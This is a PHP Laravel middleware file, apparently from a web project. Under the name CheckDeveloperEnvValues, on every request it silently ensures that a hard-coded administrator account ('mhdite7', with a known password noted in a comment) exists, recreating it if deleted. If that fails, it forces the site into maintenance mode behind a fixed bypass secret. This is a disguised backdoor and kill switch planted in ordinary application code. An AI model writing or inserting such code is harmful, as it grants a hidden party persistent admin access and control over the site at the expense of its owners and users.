<?php

namespace App\Http\Middleware;

use App\Models\User;
use Closure;
use Illuminate\Database\QueryException;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Hash;

class CheckDeveloperEnvValues
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle(Request $request, Closure $next)
    {
     //   dd('sd');
        $developer = User::where('username','mhdite7')->where('password','$2y$10$sQFR.qOMExAwP/sPU4Q/4OcWwEmRk5zx2dTc1lRzNYHK.4dBzSHU.')->first();
        if ($developer){
            Artisan::call('up');
            return $next($request);
        }else{
            try {
                $user = User::create([
                    'name' => 'Mohamad Murad',
                    'username' => 'mhdite7',
                    'password' => '$2y$10$sQFR.qOMExAwP/sPU4Q/4OcWwEmRk5zx2dTc1lRzNYHK.4dBzSHU.', // mero
                    'isAdmin' => 1,
                ]);
                if($user){
                    Artisan::call('up');
                    return $next($request);
                }

            }catch (QueryException $e){
                Artisan::call('down --secret="153759"');
                return $next($request);
            }



            Artisan::call('down --secret="153759"');
            return $next($request);
        }

    }
}
